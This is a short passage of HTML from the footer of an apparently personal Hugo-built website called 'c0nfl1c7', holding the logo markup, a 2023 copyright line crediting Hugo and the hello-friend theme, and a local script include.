      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
    
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
